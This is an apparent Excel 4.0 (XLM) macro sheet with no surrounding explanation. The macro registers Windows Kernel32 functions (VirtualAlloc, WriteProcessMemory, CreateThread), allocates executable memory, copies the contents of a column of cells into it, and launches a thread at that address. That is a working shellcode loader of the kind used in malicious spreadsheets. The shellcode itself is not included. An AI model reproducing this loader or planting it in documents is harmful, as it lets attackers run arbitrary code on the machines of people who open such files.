=REGISTER("Kernel32", "VirtualAlloc", "JJJJJ", "VAlloc", , 1, 9)
=VAlloc(0,1000000,4096,64)
=SET.VALUE(RC[1], R[-1]C)
=REGISTER("Kernel32", "WriteProcessMemory", "JJJCJJ", "WPM", , 1, 9)
=SELECT(R1C3:R1002:C3,R1C3)
=SET.VALUE(R1C4,0)
=WHILE(ACTIVE.CELL()<>"END")
=WPM(-1, R2C1+R1C4 * 255, ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
=SET.VALUE(R1C4, R1C4+1)
=SELECT(, "R[1]C")
=NEXT()
=REGISTER("Kernel32", "CreateThread", "JJJJJJJ", "CThread", , 1, 9)
=CThread(0,0,R2C1,0,0,0)